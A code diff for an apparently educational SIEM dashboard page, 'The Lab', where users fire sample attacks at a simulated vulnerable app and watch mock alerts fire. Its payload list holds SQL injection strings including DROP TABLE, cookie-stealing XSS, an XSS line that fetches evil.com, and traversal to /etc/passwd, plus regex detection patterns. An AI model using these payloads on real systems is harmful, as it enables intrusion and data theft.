@@ -7,7 +7,7 @@
   <link rel="apple-touch-icon" href="apple-touch-icon.png" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <meta name="description" content="Detection experiment bay — tune rules against synthetic attack campaigns." />
+  <meta name="description" content="Detection experiment bay — fire payloads at a vulnerable app and watch Meridian-7 SIEM rules trigger in real time." />
   <meta property="og:title" content="The Lab — HABIBI-SIEM" />
   <meta property="og:description" content="Detection experiment bay — tune rules against synthetic attack campaigns." />
   <meta property="og:image" content="https://number-1-python-glazer.github.io/SIEM-Dashboard-Documentation/screenshots/lab-og.png" />
@@ -15,58 +15,924 @@
   <meta name="twitter:card" content="summary_large_image" />
   <meta name="twitter:title" content="The Lab — HABIBI-SIEM" />
   <meta name="twitter:description" content="Detection experiment bay — tune rules against synthetic attack campaigns." />
-  <meta name="twitter:image" content="https://number-1-python-glazer.github.io/SIEM-Dashboard-Documentation/screenshots/lab-og.png" /><meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="twitter:image" content="https://number-1-python-glazer.github.io/SIEM-Dashboard-Documentation/screenshots/lab-og.png" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>The Lab — Meridian-7</title>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;700&display=swap" rel="stylesheet" />
   <link rel="stylesheet" href="assets/palette.css" />
   <link rel="stylesheet" href="assets/deck-nav.css" />
-  <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css" />
+  <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.min.js"></script>
   <style>
-    *{box-sizing:border-box;margin:0;padding:0}html,body{height:100%;background:#020617;color:#e2e8f0;font-family:Consolas,monospace;overflow:hidden}
-    #hdr{height:36px;display:flex;align-items:center;padding:0 12px;font-size:10px;letter-spacing:2px;border-bottom:1px solid rgba(56,189,248,.2)}
-    #split{display:grid;grid-template-columns:1fr 1fr;height:calc(100% - 36px)}
-    #target{padding:12px;border-right:1px solid rgba(148,163,184,.15);overflow:auto}
-    #monitor{padding:12px;display:flex;flex-direction:column;gap:8px}
-    #xterm-wrap{flex:1;min-height:140px;background:#000;border:1px solid #334155;padding:4px}
-    #payloads{width:180px;position:fixed;left:0;bottom:0;top:36px;background:rgba(15,23,42,.96);border-right:1px solid rgba(148,163,184,.15);padding:8px;font-size:9px}
-    .payload{padding:6px;margin-bottom:4px;background:rgba(248,113,113,.1);border:1px solid rgba(248,113,113,.25);cursor:pointer}
-    #chart-wrap{height:100px}
+    :root {
+      --bg-deep: #020617;
+      --bg-violet: #0a0618;
+      --phosphor-black: #030a04;
+      --blue: #38bdf8;
+      --green: #39ff14;
+      --phosphor: #34d399;
+      --indigo: #6366f1;
+      --violet: #c4b5fd;
+      --amber: #fbbf24;
+      --red: #f87171;
+      --emerald: #34d399;
+      --ink: #e2e8f0;
+      --muted: #64748b;
+      --panel: rgba(15, 23, 42, 0.94);
+      --line: rgba(56, 189, 248, 0.22);
+      --line-soft: rgba(148, 163, 184, 0.16);
+      --hdr-h: 44px;
+      --sidebar-w: 220px;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html,
+    body {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background: radial-gradient(circle at 82% 8%, rgba(99, 102, 241, 0.12), transparent 34%), var(--bg-deep);
+      color: var(--ink);
+      font-family: "IBM Plex Mono", Consolas, monospace;
+    }
+
+    body::after {
+      content: "";
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 50;
+      background: repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 2px,
+        rgba(0, 0, 0, 0.14) 2px,
+        rgba(0, 0, 0, 0.14) 4px
+      );
+    }
+
+    #hdr {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: var(--hdr-h);
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 0 14px;
+      background: var(--panel);
+      border-bottom: 1px solid var(--line);
+      font-size: 10px;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      z-index: 20;
+    }
+
+    #hdr-badge {
+      padding: 3px 8px;
+      background: rgba(248, 113, 113, 0.14);
+      border: 1px solid rgba(248, 113, 113, 0.35);
+      color: var(--red);
+      font-size: 8px;
+      border-radius: 2px;
+    }
+
+    #hdr-title {
+      color: var(--blue);
+      font-weight: 700;
+    }
+
+    #hdr-status {
+      margin-left: auto;
+      color: var(--emerald);
+      font-size: 9px;
+    }
+
+    #layout {
+      position: fixed;
+      top: var(--hdr-h);
+      left: 0;
+      right: 0;
+      bottom: 0;
+      display: grid;
+      grid-template-columns: var(--sidebar-w) 1fr 1fr;
+      min-height: 0;
+    }
+
+    #payload-sidebar {
+      background: var(--panel);
+      border-right: 1px solid var(--line-soft);
+      padding: 12px 10px;
+      overflow-y: auto;
+      scrollbar-width: thin;
+      scrollbar-color: rgba(56, 189, 248, 0.35) transparent;
+    }
+
+    .sidebar-title {
+      font-size: 9px;
+      letter-spacing: 2px;
+      color: var(--red);
+      margin-bottom: 10px;
+      padding-bottom: 6px;
+      border-bottom: 1px solid var(--line-soft);
+    }
+
+    .payload-item {
+      padding: 8px 8px;
+      margin-bottom: 5px;
+      background: rgba(248, 113, 113, 0.08);
+      border: 1px solid rgba(248, 113, 113, 0.22);
+      border-radius: 3px;
+      cursor: pointer;
+      transition: background 220ms ease, border-color 220ms ease, box-shadow 220ms ease, transform 220ms ease;
+    }
+
+    .payload-item:hover {
+      background: rgba(248, 113, 113, 0.16);
+      border-color: rgba(248, 113, 113, 0.45);
+      box-shadow: 0 0 10px rgba(248, 113, 113, 0.15);
+      transform: translateX(2px);
+    }
+
+    .payload-item:active {
+      transform: translateX(0);
+    }
+
+    .payload-name {
+      font-size: 9px;
+      font-weight: 700;
+      color: var(--amber);
+      margin-bottom: 3px;
+      letter-spacing: 0.5px;
+    }
+
+    .payload-preview {
+      font-size: 8px;
+      color: var(--muted);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .payload-type {
+      display: inline-block;
+      margin-top: 4px;
+      font-size: 7px;
+      letter-spacing: 1px;
+      padding: 1px 5px;
+      border-radius: 2px;
+      text-transform: uppercase;
+    }
+
+    .type-sqli { background: rgba(99, 102, 241, 0.2); color: var(--indigo); }
+    .type-xss { background: rgba(251, 191, 36, 0.18); color: var(--amber); }
+    .type-path { background: rgba(56, 189, 248, 0.16); color: var(--blue); }
+    .type-other { background: rgba(52, 211, 153, 0.14); color: var(--emerald); }
+
+    #app-panel {
+      border-right: 1px solid var(--line-soft);
+      display: flex;
+      flex-direction: column;
+      min-width: 0;
+      background: rgba(2, 6, 23, 0.35);
+    }
+
+    #app-chrome {
+      padding: 10px 14px;
+      border-bottom: 1px solid var(--line-soft);
+      background: rgba(10, 6, 24, 0.6);
+    }
+
+    #app-url-bar {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 6px 10px;
+      background: rgba(2, 6, 23, 0.8);
+      border: 1px solid var(--line-soft);
+      border-radius: 4px;
+      font-size: 9px;
+      color: var(--muted);
+    }
+
+    #app-url-bar span {
+      color: var(--emerald);
+    }
+
+    #tab-bar {
+      display: flex;
+      gap: 4px;
+      margin-top: 10px;
+    }
+
+    .tab-btn {
+      padding: 7px 14px;
+      font: inherit;
+      font-size: 9px;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      background: transparent;
+      border: 1px solid transparent;
+      color: var(--muted);
+      cursor: pointer;
+      border-radius: 3px 3px 0 0;
+      transition: color 220ms ease, background 220ms ease, border-color 220ms ease;
+    }
+
+    .tab-btn:hover {
+      color: var(--ink);
+      background: rgba(56, 189, 248, 0.06);
+    }
+
+    .tab-btn.active {
+      color: var(--blue);
+      background: rgba(56, 189, 248, 0.1);
+      border-color: rgba(56, 189, 248, 0.35);
+      border-bottom-color: transparent;
+      box-shadow: 0 0 8px rgba(56, 189, 248, 0.12);
+    }
+
+    #app-body {
+      flex: 1;
+      padding: 18px 16px;
+      overflow-y: auto;
+    }
+
+    .tab-pane {
+      display: none;
+      animation: tabIn 240ms ease;
+    }
+
+    .tab-pane.active {
+      display: block;
+    }
+
+    @keyframes tabIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .form-title {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--violet);
+      margin-bottom: 4px;
+    }
+
+    .form-sub {
+      font-size: 10px;
+      color: var(--muted);
+      margin-bottom: 16px;
+      line-height: 1.5;
+    }
+
+    .field-group {
+      margin-bottom: 12px;
+    }
+
+    .field-label {
+      display: block;
+      font-size: 9px;
+      letter-spacing: 1px;
+      color: var(--muted);
+      margin-bottom: 5px;
+      text-transform: uppercase;
+    }
+
+    .field-input {
+      width: 100%;
+      padding: 9px 10px;
+      background: rgba(2, 6, 23, 0.85);
+      border: 1px solid var(--line-soft);
+      color: var(--ink);
+      font: inherit;
+      font-size: 11px;
+      border-radius: 3px;
+      transition: border-color 220ms ease, box-shadow 220ms ease;
+    }
+
+    .field-input:focus {
+      outline: none;
+      border-color: rgba(56, 189, 248, 0.5);
+      box-shadow: 0 0 8px rgba(56, 189, 248, 0.2);
+    }
+
+    .action-row {
+      display: flex;
+      gap: 8px;
+      margin-top: 14px;
+    }
+
+    .btn-primary {
+      padding: 9px 18px;
+      font: inherit;
+      font-size: 10px;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      background: rgba(56, 189, 248, 0.14);
+      border: 1px solid rgba(56, 189, 248, 0.4);
+      color: var(--blue);
+      cursor: pointer;
+      border-radius: 3px;
+      transition: background 220ms ease, box-shadow 220ms ease;
+    }
+
+    .btn-primary:hover {
+      background: rgba(56, 189, 248, 0.24);
+      box-shadow: 0 0 12px rgba(56, 189, 248, 0.25);
+    }
+
+    .btn-secondary {
+      padding: 9px 14px;
+      font: inherit;
+      font-size: 10px;
+      background: transparent;
+      border: 1px solid var(--line-soft);
+      color: var(--muted);
+      cursor: pointer;
+      border-radius: 3px;
+      transition: color 220ms ease, border-color 220ms ease;
+    }
+
+    .btn-secondary:hover {
+      color: var(--ink);
+      border-color: rgba(148, 163, 184, 0.35);
+    }
+
+    #response-box {
+      margin-top: 16px;
+      padding: 12px;
+      background: rgba(2, 6, 23, 0.7);
+      border: 1px solid var(--line-soft);
+      border-radius: 3px;
+      font-size: 10px;
+      line-height: 1.55;
+      min-height: 72px;
+      color: var(--muted);
+      transition: border-color 220ms ease, color 220ms ease;
+    }
+
+    #response-box.blocked {
+      border-color: rgba(248, 113, 113, 0.4);
+      color: #fca5a5;
+    }
+
+    #response-box.ok {
+      border-color: rgba(52, 211, 153, 0.35);
+      color: #a7f3d0;
+    }
+
+    #monitor-panel {
+      display: flex;
+      flex-direction: column;
+      min-width: 0;
+      background: var(--phosphor-black);
+    }
+
+    #monitor-header {
+      padding: 10px 12px;
+      border-bottom: 1px solid rgba(57, 255, 20, 0.18);
+      font-size: 9px;
+      letter-spacing: 2px;
+      color: var(--green);
+      text-transform: uppercase;
+      background: rgba(3, 10, 4, 0.95);
+    }
+
+    #xterm-wrap {
+      flex: 1;
+      min-height: 0;
+      padding: 6px;
+      background: #000;
+    }
+
+    #xterm-wrap .xterm {
+      height: 100%;
+      text-shadow: 1px 0 rgba(255, 0, 80, 0.08), -1px 0 rgba(0, 180, 255, 0.08);
+    }
+
+    #chart-section {
+      height: 148px;
+      padding: 10px 12px 12px;
+      border-top: 1px solid rgba(57, 255, 20, 0.14);
+      background: rgba(3, 10, 4, 0.92);
+    }
+
+    #chart-title {
+      font-size: 8px;
+      letter-spacing: 1.5px;
+      color: var(--muted);
+      margin-bottom: 6px;
+      text-transform: uppercase;
+    }
+
+    #chart-wrap {
+      height: calc(100% - 18px);
+      position: relative;
+    }
+
+    #tutorial-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(2, 6, 23, 0.82);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 100;
+      transition: opacity 320ms ease, visibility 320ms ease;
+    }
+
+    #tutorial-overlay.hidden {
+      opacity: 0;
+      visibility: hidden;
+      pointer-events: none;
+    }
+
+    #tutorial-card {
+      max-width: 420px;
+      padding: 28px 32px;
+      background: rgba(10, 6, 24, 0.96);
+      border: 1px solid rgba(56, 189, 248, 0.35);
+      border-radius: 6px;
+      text-align: center;
+      box-shadow: 0 0 32px rgba(56, 189, 248, 0.15);
+    }
+
+    #tutorial-card h2 {
+      font-size: 13px;
+      color: var(--blue);
+      letter-spacing: 2px;
+      margin-bottom: 12px;
+      text-transform: uppercase;
+    }
+
+    #tutorial-card p {
+      font-size: 11px;
+      color: var(--ink);
+      line-height: 1.6;
+      margin-bottom: 8px;
+    }
+
+    #tutorial-card .hint {
+      font-size: 9px;
+      color: var(--muted);
+      margin-top: 12px;
+    }
+
+    .upload-zone {
+      border: 1px dashed rgba(148, 163, 184, 0.35);
+      border-radius: 4px;
+      padding: 20px;
+      text-align: center;
+      color: var(--muted);
+      font-size: 10px;
+      margin-bottom: 12px;
+      transition: border-color 220ms ease, background 220ms ease;
+    }
+
+    .upload-zone.drag {
+      border-color: rgba(56, 189, 248, 0.5);
+      background: rgba(56, 189, 248, 0.06);
+    }
   </style>
 </head>
 <body>
-  <div id="hdr">THE LAB · TARGET + SIEM MONITOR</div>
-  <aside id="payloads"><h3 style="font-size:8px;letter-spacing:2px;margin-bottom:8px">PAYLOADS</h3><div class="payload" data-p="' OR 1=1--">SQLi probe</div><div class="payload" data-p="&lt;script&gt;x&lt;/script&gt;">XSS probe</div><div class="payload" data-p="../../../etc/passwd">Path traversal</div></aside>
-  <div id="split" style="margin-left:180px">
-    <div id="target"><h3 style="font-size:10px;margin-bottom:8px">VULN APP (stub)</h3><input id="lab-input" style="width:100%;padding:8px;margin-bottom:8px;background:#1e293b;border:1px solid #475569;color:#e2e8f0;font:inherit" placeholder="Enter payload" /><button id="lab-send" style="padding:8px 16px;cursor:pointer;font:inherit">Send</button><p id="lab-response" style="margin-top:12px;font-size:11px;color:#94a3b8">Response will appear here.</p></div>
-    <div id="monitor"><div id="xterm-wrap"></div><div id="chart-wrap"><canvas id="metrics"></canvas></div></div>
+  <header id="hdr">
+    <span id="hdr-badge">SANDBOX</span>
+    <span id="hdr-title">The Lab · Payload Injection Bay</span>
+    <span id="hdr-status">SIEM monitor online · 847 rules active</span>
+  </header>
+
+  <div id="layout">
+    <aside id="payload-sidebar">
+      <div class="sidebar-title">Payload Library</div>
+      <div id="payload-list"></div>
+    </aside>
+
+    <section id="app-panel">
+      <div id="app-chrome">
+        <div id="app-url-bar">
+          <span>🔒</span> https://vuln-app.internal.meridian-7/<span id="url-path">login</span>
+        </div>
+        <div id="tab-bar">
+          <button type="button" class="tab-btn active" data-tab="login">Login</button>
+          <button type="button" class="tab-btn" data-tab="search">Search</button>
+          <button type="button" class="tab-btn" data-tab="upload">File Upload</button>
+        </div>
+      </div>
+      <div id="app-body">
+        <div class="tab-pane active" id="pane-login">
+          <div class="form-title">Employee Portal Login</div>
+          <div class="form-sub">Authenticate against legacy HR database. Session tokens stored in plaintext cookie jar.</div>
+          <div class="field-group">
+            <label class="field-label" for="login-user">Username</label>
+            <input type="text" id="login-user" class="field-input" placeholder="analyst@meridian-7.local" autocomplete="off" />
+          </div>
+          <div class="field-group">
+            <label class="field-label" for="login-pass">Password</label>
+            <input type="password" id="login-pass" class="field-input" placeholder="••••••••" autocomplete="off" />
+          </div>
+          <div class="action-row">
+            <button type="button" class="btn-primary" id="btn-login">Sign In</button>
+            <button type="button" class="btn-secondary" id="btn-login-reset">Clear</button>
+          </div>
+        </div>
+
+        <div class="tab-pane" id="pane-search">
+          <div class="form-title">Knowledge Base Search</div>
+          <div class="form-sub">Full-text search over incident runbooks. Output rendered without sanitization.</div>
+          <div class="field-group">
+            <label class="field-label" for="search-q">Query</label>
+            <input type="text" id="search-q" class="field-input" placeholder="Search runbooks, IOCs, playbooks…" autocomplete="off" />
+          </div>
+          <div class="action-row">
+            <button type="button" class="btn-primary" id="btn-search">Search</button>
+            <button type="button" class="btn-secondary" id="btn-search-reset">Clear</button>
+          </div>
+        </div>
+
+        <div class="tab-pane" id="pane-upload">
+          <div class="form-title">Evidence File Upload</div>
+          <div class="form-sub">Accepts any extension. Files written to /var/www/uploads without validation.</div>
+          <div class="upload-zone" id="upload-zone">Drop file here or specify filename below</div>
+          <div class="field-group">
+            <label class="field-label" for="upload-name">Filename</label>
+            <input type="text" id="upload-name" class="field-input" placeholder="evidence_2024.log" autocomplete="off" />
+          </div>
+          <div class="action-row">
+            <button type="button" class="btn-primary" id="btn-upload">Upload</button>
+            <button type="button" class="btn-secondary" id="btn-upload-reset">Clear</button>
+          </div>
+        </div>
+
+        <div id="response-box">Awaiting request — select a payload or enter input manually, then submit.</div>
+      </div>
+    </section>
+
+    <section id="monitor-panel">
+      <div id="monitor-header">SIEM Monitor · /var/log/siem/alerts.log</div>
+      <div id="xterm-wrap"></div>
+      <div id="chart-section">
+        <div id="chart-title">Alert Count by Rule Type</div>
+        <div id="chart-wrap"><canvas id="metrics-chart"></canvas></div>
+      </div>
+    </section>
   </div>
+
+  <div id="tutorial-overlay">
+    <div id="tutorial-card">
+      <h2>Detection Lab</h2>
+      <p>Fire a payload to begin detection monitoring.</p>
+      <p>Select an attack pattern from the sidebar, inject it into the vulnerable app, and watch Meridian-7 SIEM rules trigger in the monitor.</p>
+      <p class="hint">After 3 hits of the same attack type, a correlation rule will escalate.</p>
+    </div>
+  </div>
+
   <script src="assets/siem-core.js"></script>
   <script src="assets/palette.js"></script>
   <script>
-  (function(){
-    SiemCore.bootPage('lab'); SiemCore.AchievementSystem.check('visit_lab');
-    var term=new Terminal({theme:{background:'#000000',foreground:'#34d399',cursor:'#38bdf8'},fontSize:10,fontFamily:'Consolas, monospace'});
-    var fitAddon = typeof FitAddon !== 'undefined' ? new FitAddon.FitAddon() : null;
-    if (fitAddon) term.loadAddon(fitAddon);
-    term.open(document.getElementById('xterm-wrap'));if(fitAddon)fitAddon.fit();
-    term.writeln('\x1b[32m> lab session online — tail -f /var/log/siem/alerts.log\x1b[0m');
-    var hits=0;
-    function appendLog(m){
-      var ts=new Date().toISOString().slice(11,19);
-      term.writeln('['+ts+'] '+m);
-    }
-    var chart=new Chart(document.getElementById('metrics'),{type:'line',data:{labels:[],datasets:[{label:'Alerts/min',data:[],borderColor:'#38bdf8',tension:0.3}]},options:{responsive:true,maintainAspectRatio:false,plugins:{legend:{display:false}},scales:{x:{display:false},y:{beginAtZero:true}}}});
-    document.getElementById('lab-send').onclick=function(){
-      var p=document.getElementById('lab-input').value;
-      hits++; appendLog('ALERT rule=lab-test severity=HIGH payload='+JSON.stringify(p));
-      document.getElementById('lab-response').textContent='HTTP 500 — blocked by WAF (simulated)';
-      chart.data.labels.push('');chart.data.datasets[0].data.push(hits);if(chart.data.labels.length>20){chart.data.labels.shift();chart.data.datasets[0].data.shift();}chart.update();
+  (function () {
+    'use strict';
+
+    SiemCore.bootPage('lab');
+    SiemCore.AchievementSystem.check('visit_lab');
+
+    var PAYLOADS = [
+      { name: 'SQLi Auth Bypass', payload: "' OR 1=1--", type: 'sqli', tab: 'login', field: 'login-user' },
+      { name: 'SQLi Destructive', payload: "'; DROP TABLE users;--", type: 'sqli', tab: 'login', field: 'login-user' },
+      { name: 'Blind SQLi', payload: 'sleep(5)--', type: 'sqli', tab: 'login', field: 'login-pass' },
+      { name: 'Stored XSS', payload: '<scr' + 'ipt>document.cookie</scr' + 'ipt>', type: 'xss', tab: 'search', field: 'search-q' },
+      { name: 'Reflected XSS', payload: '<img src=x onerror=alert(1)>', type: 'xss', tab: 'search', field: 'search-q' },
+      { name: 'XSS Exfiltration', payload: "<svg/onload=fetch('//evil.com')>", type: 'xss', tab: 'search', field: 'search-q' },
+      { name: 'Path Traversal (Unix)', payload: '../../../etc/passwd', type: 'path', tab: 'search', field: 'search-q' },
+      { name: 'Encoded Traversal', payload: '%2F%2F%2F', type: 'path', tab: 'search', field: 'search-q' },
+      { name: 'Windows Traversal', payload: '../../../windows/win.ini', type: 'path', tab: 'search', field: 'search-q' },
+      { name: 'Null Byte Injection', payload: '\\x00\\x1a', type: 'other', tab: 'search', field: 'search-q' },
+      { name: 'Double Extension', payload: 'test.jpg.php', type: 'other', tab: 'upload', field: 'upload-name' },
+      { name: 'EICAR Test String', payload: 'EICAR-STANDARD-ANTIVIRUS-TEST-FILE', type: 'other', tab: 'upload', field: 'upload-name' }
+    ];
+
+    var RULE_MAP = {
+      sqli: { rule: 'sql-injection', sev: 'HIGH', action: 'BLOCKED', confidence: 0.97 },
+      xss: { rule: 'xss-attempt', sev: 'HIGH', action: 'BLOCKED', confidence: 0.94 },
+      path: { rule: 'path-traversal', sev: 'MED', action: 'BLOCKED', confidence: 0.91 },
+      other: { rule: 'malware-signature', sev: 'CRIT', action: 'QUARANTINED', confidence: 0.99 }
     };
-    document.querySelectorAll('.payload').forEach(function(el){el.onclick=function(){document.getElementById('lab-input').value=el.dataset.p;};});
-    setInterval(function(){appendLog('heartbeat src=lab-monitor status=ok');},8000);
-    addEventListener('resize',function(){if(fitAddon)fitAddon.fit();});
+
+    var CHART_LABELS = ['SQLi', 'XSS', 'Path Traversal', 'Other'];
+    var chartCounts = { sqli: 0, xss: 0, path: 0, other: 0 };
+    var typeHitCounts = { sqli: 0, xss: 0, path: 0, other: 0 };
+    var correlationFired = { sqli: false, xss: false, path: false, other: false };
+    var tutorialDismissed = false;
+    var activeTab = 'login';
+    var totalAlerts = 0;
+
+    var payloadListEl = document.getElementById('payload-list');
+    PAYLOADS.forEach(function (p, idx) {
+      var el = document.createElement('div');
+      el.className = 'payload-item';
+      el.dataset.index = String(idx);
+      el.innerHTML =
+        '<div class="payload-name">' + p.name + '</div>' +
+        '<div class="payload-preview">' + escapeHtml(p.payload) + '</div>' +
+        '<span class="payload-type type-' + p.type + '">' + p.type + '</span>';
+      payloadListEl.appendChild(el);
+    });
+
+    function escapeHtml(s) {
+      return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+    }
+
+    function pad(n) { return n < 10 ? '0' + n : String(n); }
+
+    function timestamp() {
+      var d = new Date();
+      return pad(d.getUTCHours()) + ':' + pad(d.getUTCMinutes()) + ':' + pad(d.getUTCSeconds());
+    }
+
+    var term = new Terminal({
+      theme: {
+        background: '#000000',
+        foreground: '#34d399',
+        cursor: '#38bdf8',
+        brightBlack: '#334155'
+      },
+      fontSize: 11,
+      fontFamily: '"IBM Plex Mono", Consolas, monospace',
+      cursorBlink: true,
+      scrollback: 800
+    });
+
+    var fitAddon = new FitAddon.FitAddon();
+    term.loadAddon(fitAddon);
+    term.open(document.getElementById('xterm-wrap'));
+    fitAddon.fit();
+
+    term.writeln('\x1b[38;2;57;255;20m╔══════════════════════════════════════════════════╗\x1b[0m');
+    term.writeln('\x1b[38;2;57;255;20m║  MERIDIAN-7 SIEM · LAB MONITOR v15.2             ║\x1b[0m');
+    term.writeln('\x1b[38;2;57;255;20m║  tail -f /var/log/siem/alerts.log                ║\x1b[0m');
+    term.writeln('\x1b[38;2;57;255;20m╚══════════════════════════════════════════════════╝\x1b[0m');
+    term.writeln('');
+    term.writeln('\x1b[90m[' + timestamp() + '] session=lab-user ingest=online rules=847\x1b[0m');
+    term.writeln('\x1b[90mAwaiting payload injection from vulnerable app panel…\x1b[0m');
+
+    var chart = new Chart(document.getElementById('metrics-chart'), {
+      type: 'bar',
+      data: {
+        labels: CHART_LABELS,
+        datasets: [{
+          label: 'Alerts',
+          data: [0, 0, 0, 0],
+          backgroundColor: [
+            'rgba(99, 102, 241, 0.75)',
+            'rgba(251, 191, 36, 0.75)',
+            'rgba(56, 189, 248, 0.75)',
+            'rgba(52, 211, 153, 0.75)'
+          ],
+          borderColor: [
+            '#6366f1',
+            '#fbbf24',
+            '#38bdf8',
+            '#34d399'
+          ],
+          borderWidth: 1,
+          borderRadius: 3
+        }]
+      },
+      options: {
+        responsive: true,
+        maintainAspectRatio: false,
+        animation: { duration: 320, easing: 'easeOutQuart' },
+        plugins: {
+          legend: { display: false },
+          tooltip: {
+            backgroundColor: 'rgba(10, 6, 24, 0.95)',
+            titleFont: { family: '"IBM Plex Mono", Consolas, monospace', size: 10 },
+            bodyFont: { family: '"IBM Plex Mono", Consolas, monospace', size: 10 },
+            borderColor: 'rgba(56, 189, 248, 0.35)',
+            borderWidth: 1
+          }
+        },
+        scales: {
+          x: {
+            ticks: {
+              color: '#64748b',
+              font: { family: '"IBM Plex Mono", Consolas, monospace', size: 9 }
+            },
+            grid: { color: 'rgba(148, 163, 184, 0.08)' }
+          },
+          y: {
+            beginAtZero: true,
+            ticks: {
+              stepSize: 1,
+              color: '#64748b',
+              font: { family: '"IBM Plex Mono", Consolas, monospace', size: 9 }
+            },
+            grid: { color: 'rgba(148, 163, 184, 0.1)' }
+          }
+        }
+      }
+    });
+
+    function switchTab(tab) {
+      activeTab = tab;
+      document.querySelectorAll('.tab-btn').forEach(function (btn) {
+        btn.classList.toggle('active', btn.dataset.tab === tab);
+      });
+      document.querySelectorAll('.tab-pane').forEach(function (pane) {
+        pane.classList.toggle('active', pane.id === 'pane-' + tab);
+      });
+      document.getElementById('url-path').textContent = tab === 'upload' ? 'upload' : tab;
+    }
+
+    document.getElementById('tab-bar').addEventListener('click', function (e) {
+      var btn = e.target.closest('.tab-btn');
+      if (btn) switchTab(btn.dataset.tab);
+    });
+
+    function getActiveInputId() {
+      if (activeTab === 'login') return document.getElementById('login-user').value ? 'login-user' : 'login-pass';
+      if (activeTab === 'search') return 'search-q';
+      return 'upload-name';
+    }
+
+    function fillPayload(payloadDef) {
+      switchTab(payloadDef.tab);
+      var el = document.getElementById(payloadDef.field);
+      if (el) {
+        el.value = payloadDef.payload;
+        el.focus();
+      }
+    }
+
+    function detectTypeFromInput(text, tab) {
+      var lower = text.toLowerCase();
+      if (tab === 'upload') {
+        if (/eicar|\.php|\.exe|\.bat/i.test(text)) return 'other';
+        return 'other';
+      }
+      if (/'\s*or\s|drop\s+table|sleep\s*\(|union\s+select|--/i.test(text)) return 'sqli';
+      if (/<script|<img|<svg|onerror|onload|javascript:/i.test(text)) return 'xss';
+      if (/\.\.\/|%2f%2f|etc\/passwd|win\.ini/i.test(text)) return 'path';
+      if (/\\x00|\\x1a|%00/i.test(text)) return 'other';
+      if (/\.php|\.jsp|eicar/i.test(text)) return 'other';
+      return 'other';
+    }
+
+    function dismissTutorial() {
+      if (tutorialDismissed) return;
+      tutorialDismissed = true;
+      document.getElementById('tutorial-overlay').classList.add('hidden');
+    }
+
+    function writeAlert(type, payloadText) {
+      var meta = RULE_MAP[type] || RULE_MAP.other;
+      var ts = timestamp();
+      term.writeln('');
+      term.writeln('\x1b[38;2;248;113;113m[' + ts + '] ALERT rule=' + meta.rule + ' sev=' + meta.sev + ' src=lab-user\x1b[0m');
+      term.writeln('  payload=' + payloadText);
+      term.writeln('  action=' + meta.action + ' confidence=' + meta.confidence);
+
+      chartCounts[type] = (chartCounts[type] || 0) + 1;
+      chart.data.datasets[0].data = [
+        chartCounts.sqli,
+        chartCounts.xss,
+        chartCounts.path,
+        chartCounts.other
+      ];
+      chart.update();
+
+      typeHitCounts[type] = (typeHitCounts[type] || 0) + 1;
+      totalAlerts++;
+
+      if (typeHitCounts[type] >= 3 && !correlationFired[type]) {
+        correlationFired[type] = true;
+        var corrTs = timestamp();
+        var corrRule = type === 'sqli' ? 'repeated-sqli' :
+          type === 'xss' ? 'repeated-xss' :
+          type === 'path' ? 'repeated-traversal' : 'repeated-malware';
+        term.writeln('');
+        term.writeln('\x1b[38;2;251;191;36m[' + corrTs + '] CORRELATED rule=' + corrRule + ' count=3 window=30s\x1b[0m');
+        term.writeln('  action=BLOCK_IP src=lab-user');
+      }
+    }
+
+    function processSubmission(sourceLabel) {
+      var text = '';
+      var tab = activeTab;
+
+      if (tab === 'login') {
+        text = document.getElementById('login-user').value || document.getElementById('login-pass').value;
+      } else if (tab === 'search') {
+        text = document.getElementById('search-q').value;
+      } else {
+        text = document.getElementById('upload-name').value;
+      }
+
+      if (!text.trim()) {
+        document.getElementById('response-box').textContent = 'HTTP 400 — empty input rejected by app server.';
+        document.getElementById('response-box').className = '';
+        return;
+      }
+
+      dismissTutorial();
+
+      var type = detectTypeFromInput(text, tab);
+      var isAttack = type !== 'other' || /eicar|\.php|\\x00|%2f/i.test(text);
+
+      if (!isAttack && text.length < 20) {
+        document.getElementById('response-box').textContent = 'HTTP 200 OK — ' + sourceLabel + ' processed normally. No SIEM alert.';
+        document.getElementById('response-box').className = 'ok';
+        return;
+      }
+
+      writeAlert(type, text);
+
+      var resp = document.getElementById('response-box');
+      resp.className = 'blocked';
+      if (tab === 'login') {
+        resp.textContent = 'HTTP 403 Forbidden — WAF blocked authentication attempt. Session not established. Meridian-7 rule ' + RULE_MAP[type].rule + ' fired.';
+      } else if (tab === 'search') {
+        resp.textContent = 'HTTP 500 Internal Server Error — query rejected by input filter. Reflected output suppressed. SIEM alert dispatched.';
+      } else {
+        resp.textContent = 'HTTP 413 Payload Too Large — upload quarantined by AV scanner. File not written to /var/www/uploads.';
+      }
+    }
+
